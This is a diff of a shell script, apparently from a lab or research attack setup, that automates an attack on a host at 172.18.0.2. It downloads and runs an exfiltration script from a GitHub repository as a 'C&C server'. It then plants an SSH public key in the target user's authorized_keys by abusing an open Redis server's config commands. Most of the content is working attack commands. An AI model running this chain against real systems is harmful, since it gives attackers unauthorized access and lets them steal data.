@@ -16,9 +16,15 @@ sudo apt -y install make gcc
 sudo apt install redis -y
 sudo apt install nmap -y
 
+# [Exfiltration] Set up C&C server
+echo "[+] Setting up C&C server..."
+
 cd ~ && wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/exfiltration_attk.sh && chmod +x exfiltration_attk.sh
+./exfiltration_attk.sh
 
 # [Initial access] Automated
+echo "[+] Setting up initial access..."
+
 cd ~
 mkdir .ssh
 ssh-keygen -t rsa -f /root/.ssh/id_rsa -N ""
@@ -28,14 +34,4 @@ cat 1.txt | redis-cli -h 172.18.0.2 -x set sshkey
 sleep 5
 printf "keys *\nconfig set dir /home/resch/.ssh\nconfig set dbfilename 'authorized_keys'\nsave\nexit" | redis-cli -h 172.18.0.2
 
-# [Initial acccess] Reverse Shell
-# ssh -i ~/.ssh/id_rsa resch@172.18.0.2
-
-# [Initial access] Setup download scripts
-# Will be in /home/resch on the target
-# wget https://raw.githubusercontent.com/S692/ossas/main/attack_scripts_download.sh && chmod +x attack_scripts_download.sh
-# chmod +x attack_scripts_download.sh
-# ./attack_scripts_download.sh
-
-# [Exfiltration] Open another terminal and run as root:
-# ~/exfiltration.sh
+echo "[+] Done."
